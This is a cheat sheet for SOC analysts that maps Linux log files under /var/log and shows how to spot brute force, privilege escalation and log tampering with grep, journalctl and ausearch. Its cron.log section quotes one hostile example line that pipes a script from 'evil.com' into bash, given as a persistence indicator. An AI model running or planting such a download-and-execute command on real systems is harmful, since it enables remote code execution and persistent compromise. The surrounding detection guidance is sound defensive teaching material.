# Linux Log Directories Cheat Sheet for SOC Analysts

**Priority: P1 — Know your way around `/var/log` before your first Linux alert**

---

## The `/var/log` Map

```
/var/log/
├── auth.log            # Debian/Ubuntu — authentication (sshd, sudo, su, login, PAM)
├── secure              # RHEL/CentOS/Fedora — same purpose as auth.log
├── syslog              # Debian/Ubuntu — general system messages
├── messages            # RHEL/CentOS — general system messages
├── kern.log            # Kernel messages (Debian)
├── dmesg               # Kernel ring buffer (boot + recent kernel output)
├── daemon.log          # Background daemons
├── cron.log            # Cron job execution (Debian/Ubuntu)
├── mail.log            # Mail server traffic (Debian) — maillog on RHEL
├── boot.log            # Boot process messages
├── apache2/  httpd/    # Web server access + error logs
├── nginx/              # nginx access + error logs
├── mysql/  mariadb/    # Database logs
├── postgresql/         # PostgreSQL logs
├── fail2ban.log        # Fail2ban ban events
├── ufw.log             # UFW firewall (Debian/Ubuntu)
├── audit/audit.log     # Linux Audit daemon — syscalls, exec, file access
├── journal/            # systemd journal (binary — read with journalctl)
├── wtmp                # Login history (binary — read with last)
├── btmp                # Failed logins (binary — read with lastb)
├── lastlog             # Last login per user (binary — read with lastlog)
├── dpkg.log            # Package installs (Debian) — yum.log on RHEL
└── faillog             # Legacy failed-login records
```

**Rule of thumb:** Debian family = `auth.log` + `syslog`; RHEL family = `secure` + `messages`. Everything else is roughly the same.

---

## Authentication Logs (auth.log / secure)

### Anatomy of a Log Line

```
Feb 15 10:23:45 server01 sshd[12345]: Accepted password for john from 192.168.1.50 port 54321 ssh2
│         │         │       │            │
date    time   host   service[PID]      event details
```

### What to Look For

| Event | Example | Signal |
|-------|---------|--------|
| Failed password | `Failed password for root from 45.155.205.10` | Brute force / spray |
| Accepted password | `Accepted password for john from 192.168.1.50` | Successful logon — verify source |
| Accepted publickey | `Accepted publickey for svc-ctm from 10.0.0.7` | Key auth — check key provenance |
| Session opened | `session opened for user john by (uid=0)` | Interactive session |
| Sudo | `sudo: john : TTY=pts/0 ; COMMAND=/bin/bash` | Privilege escalation |
| New user | `new user: name=backup, UID=1002` | Backdoor account creation |
| Failed sudo | `sudo: 1 incorrect password attempt` | Credential stuffing via sudo |
| Invalid user | `Invalid user admin from 185.220.101.34` | User enumeration |

---

## System Logs

### syslog / messages
- General daemon and kernel output (Debian: `syslog`, RHEL: `messages`)
- Useful for service crashes, kernel panics, `systemd` messages
- **SOC value**: detect services killed/restarted, OOM killer events, disk errors

### kern.log / dmesg
- Kernel ring buffer: hardware, drivers, memory, network interfaces
- **SOC value**: `killed process ... out of memory` can indicate cryptominer; `nf_conntrack: table full` can indicate a flood
- `dmesg` is cleared at reboot and can be cleared by root (`dmesg -c`) — a reset buffer is suspicious

### cron.log
- Cron executions: `CMD (root curl -s http://evil.com/s.sh | bash)` = persistence
- Check for: commands running as root, URLs, base64, downloaders

---

## Service & Application Logs

| Log | Location | What to Check |
|-----|----------|---------------|
| nginx | `/var/log/nginx/access.log` + `error.log` | Scan patterns, directory traversal (`../`), `%0a` encoding, POST floods |
| Apache | `/var/log/apache2/access.log` + `error.log` | Same as nginx |
| MySQL/MariaDB | `/var/log/mysql/*.log` | SQLi attempts, slow queries, unauthorized connections |
| PostgreSQL | `/var/log/postgresql/*.log` | SQLi, failed auth from unusual IPs |
| Fail2ban | `/var/log/fail2ban.log` | Repeated bans = attack waves; sudden stop = fail2ban disabled |
| UFW/iptables | `/var/log/ufw.log` | Blocked traffic bursts |

### Web Access Log Fields
```
$1       $4 $5          $6      $7      $9
IP  [date]  "GET /path HTTP/1.1"  200
```
**One-liner to find top IPs hitting a web server:**
```bash
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head
```

---

## auditd — The Deep Log

### Where It Lives
- `/var/log/audit/audit.log` — not written by syslog; separate daemon
- Logs **syscalls**, **executions**, **file access**, **permission changes** — the "Windows Event Log of Linux"

### Golden Rules
- **Each entry has a type + a key**: `type=EXECVE` / `key=identity`
- Query with `ausearch` / `aureport`, never grep the raw file when you can avoid it
- `SYSCALL` entries tie PID, UID, exe, and args together — the breadcrumb trail

### Key Types
| Type | Meaning | SOC Use |
|------|---------|---------|
| `EXECVE` | Command executed | See exact command + args |
| `USER_AUTH` | User authentication | Logon/logoff, sudo |
| `CONFIG_CHANGE` | Audit rules changed | Attackers may disable auditd |
| `DELETE` / `WRITE` | File deleted / written | Log tampering, web shell drops |
| `NETFILTER_CFG` | Firewall rules changed | Firewall disabled/weakened |

---

## systemd Journal (journalctl)

### Where It's Stored
| Location | Persistence |
|----------|-------------|
| `/var/log/journal/` | Persistent — survives reboot (enabled via `Storage=persistent`) |
| `/run/log/journal/` | Volatile — **gone on reboot** (default on many systems) |

### Essential Queries
```bash
journalctl --since "2 hours ago"        # Time window
journalctl -u sshd                      # One unit (service)
journalctl -p err -b                    # Errors since boot (-b = this boot)
journalctl -k                           # Kernel messages only
journalctl -f                           # Follow (tail -f equivalent)
journalctl --disk-usage                 # Size check
```

### Log Tampering Signal
- `journalctl` refuses to show entries or shows a gap after a reboot
- Check `--disk-usage` for a sudden small size — attackers delete the journal

---

## Log Rotation & Tampering Indicators

### How Rotation Works
- `logrotate` (via cron) renames logs daily/weekly, compresses with gzip
- Typical naming:
  ```
  auth.log      ← current
  auth.log.1    ← yesterday
  auth.log.2.gz ← compressed
  auth.log.3.gz
  ```
- Oldest logs drop off — **a gap in the middle is a tampering sign**

### Tampering Red Flags
- **Log file size 0** or much smaller than peers — `auth.log` wiped
- **Timestamps out of order** — log spliced or regenerated
- **Gaps at reboot** for `journal/` persistent storage
- **`/var/log` cleared** but the process still holds the file open:
  ```bash
  lsof | grep deleted | grep -i log
  ```
- **Immutable flag** set on a log (`lsattr`) — attacker froze it to stop evidence
- `.bash_history` reset to 0, `dmesg` cleared — coordinated cleanup

### Prevention Checks (What a Good Box Looks Like)
```bash
ls -la /var/log/                      # Look for zero-byte logs
journalctl --disk-usage               # Journal size looks normal?
last | head -30                       # Login history intact?
cat /etc/logrotate.conf               # Rotation still configured?
```

---

## Distro Quick Reference

| Concern | Debian / Ubuntu | RHEL / CentOS / Fedora |
|---------|-----------------|------------------------|
| Auth log | `/var/log/auth.log` | `/var/log/secure` |
| General messages | `/var/log/syslog` | `/var/log/messages` |
| Kernel | `/var/log/kern.log` | `dmesg` |
| Mail | `/var/log/mail.log` | `/var/log/maillog` |
| Cron | `/var/log/cron.log` | `/var/log/cron` |
| Packages | `dpkg.log` | `yum.log` |
| Firewall | `ufw.log` | iptables log (RSYSLOG) |

---

## Quick Reference — What to Grep Where

| Objective | Command |
|-----------|---------|
| Failed SSH | `grep "Failed password" /var/log/auth.log` |
| Accepted SSH | `grep "Accepted" /var/log/auth.log` |
| Sudo usage | `grep "sudo:" /var/log/auth.log` |
| New accounts | `grep "new user" /var/log/auth.log` |
| All logins today | `journalctl --since today | grep -i sshd` |
| Web scan sources | `awk '{print $1}' /var/log/nginx/access.log \| sort \| uniq -c \| sort -nr \| head` |
| Deleted logs | `lsof \| grep deleted` |
| Audit trail | `ausearch -k identity -ts today` |

---

## Summary — L1 Must Know

- [ ] Navigate `/var/log` and know what each file is for
- [ ] Know the auth.log ↔ secure naming difference by distro
- [ ] Read an auth.log line (time, host, service, event, user, source IP)
- [ ] Use `journalctl` (time window, unit, priority) instead of grepping raw journal
- [ ] Find log rotation gaps and zero-byte logs (tampering)
- [ ] Check `audit/audit.log` with `ausearch`/`aureport`
- [ ] Spot cryptominer / service-failure patterns in `kern.log` / `dmesg`
- [ ] Identify web scan patterns in nginx/apache access logs
- [ ] Look for cron entries that download and execute
